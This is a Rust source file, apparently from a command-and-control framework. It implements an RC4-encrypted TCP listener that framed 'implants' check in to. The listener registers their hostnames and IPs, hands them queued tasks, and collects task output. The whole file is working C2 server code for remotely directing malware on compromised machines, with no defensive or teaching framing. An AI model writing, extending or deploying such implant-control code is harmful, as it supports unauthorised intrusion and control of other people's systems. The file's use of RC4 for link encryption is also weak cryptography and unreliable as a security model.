use crate::core::events::Event;
use crate::protocol::{crypto, wire};
use crate::state::AppState;
use std::net::SocketAddr;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpListener;
use tracing::{error, info, warn};

pub async fn start_smb_listener(
    state: AppState,
    bind: &str,
    port: u16,
    rc4_key: &[u8],
) -> Result<(), String> {
    let addr: SocketAddr = format!("{}:{}", bind, port)
        .parse()
        .map_err(|e| format!("invalid bind: {}", e))?;

    let listener = TcpListener::bind(addr)
        .await
        .map_err(|e| format!("bind error: {}", e))?;

    info!("SMB pipe listener on {} (TCP, pipe-protocol framing)", addr);

    let rc4_key = rc4_key.to_vec();

    loop {
        let (stream, peer) = match listener.accept().await {
            Ok(r) => r,
            Err(e) => {
                error!("accept error: {}", e);
                continue;
            }
        };

        let state = state.clone();
        let key = rc4_key.clone();

        tokio::spawn(async move {
            if let Err(e) = handle_pipe_client(stream, peer, state, &key).await {
                warn!("pipe client {} error: {}", peer, e);
            }
        });
    }
}

async fn handle_pipe_client(
    mut stream: tokio::net::TcpStream,
    peer: SocketAddr,
    state: AppState,
    rc4_key: &[u8],
) -> Result<(), String> {
    let listener_id = format!("smb://{}", peer);

    loop {
        let mut len_buf = [0u8; 4];
        if stream.read_exact(&mut len_buf).await.is_err() {
            return Ok(());
        }
        let msg_len = u32::from_le_bytes(len_buf) as usize;

        if msg_len == 0 || msg_len > 10 * 1024 * 1024 {
            return Err("invalid frame length".into());
        }

        let mut payload = vec![0u8; msg_len];
        stream
            .read_exact(&mut payload)
            .await
            .map_err(|e| format!("read: {}", e))?;

        let plaintext = crypto::decrypt(&payload, rc4_key);

        if plaintext.is_empty() {
            continue;
        }

        match plaintext[0] {
            0x01 => {
                let checkin = wire::parse_checkin(&plaintext)
                    .map_err(|e| format!("parse checkin: {}", e))?;
                let agent_hex = hex::encode(checkin.agent_id);

                let _ = state.implants.handle_checkin(
                    &checkin.agent_id,
                    &checkin.hostname,
                    checkin.sleep_ms,
                    &peer.ip().to_string(),
                    &listener_id,
                );

                state.events.publish(
                    Event::new("implant_checkin", &format!("SMB: {}", checkin.hostname))
                        .with_agent(&agent_hex),
                );

                let tasks = state
                    .tasks
                    .drain_for_implant(&checkin.agent_id)
                    .unwrap_or_default();
                let task_list = wire::serialize_task_list(&tasks);
                let encrypted = crypto::encrypt(&task_list, rc4_key);

                let len_bytes = (encrypted.len() as u32).to_le_bytes();
                stream
                    .write_all(&len_bytes)
                    .await
                    .map_err(|e| format!("write: {}", e))?;
                stream
                    .write_all(&encrypted)
                    .await
                    .map_err(|e| format!("write: {}", e))?;
            }
            0x03 => {
                let result = wire::parse_result(&plaintext)
                    .map_err(|e| format!("parse result: {}", e))?;
                let agent_hex = hex::encode(result.agent_id);

                let _ = state.tasks.complete(
                    result.task_id as i64,
                    result.success,
                    &result.output,
                );

                state.events.publish(
                    Event::new("task_complete", &format!("SMB: success={}", result.success))
                        .with_agent(&agent_hex)
                        .with_task(result.task_id as i64),
                );

                let ack = [0x00; 1];
                let encrypted = crypto::encrypt(&ack, rc4_key);
                let len_bytes = (encrypted.len() as u32).to_le_bytes();
                stream
                    .write_all(&len_bytes)
                    .await
                    .map_err(|e| format!("write: {}", e))?;
                stream
                    .write_all(&encrypted)
                    .await
                    .map_err(|e| format!("write: {}", e))?;
            }
            other => {
                warn!("unknown msg type from {}: 0x{:02x}", peer, other);
            }
        }
    }
}
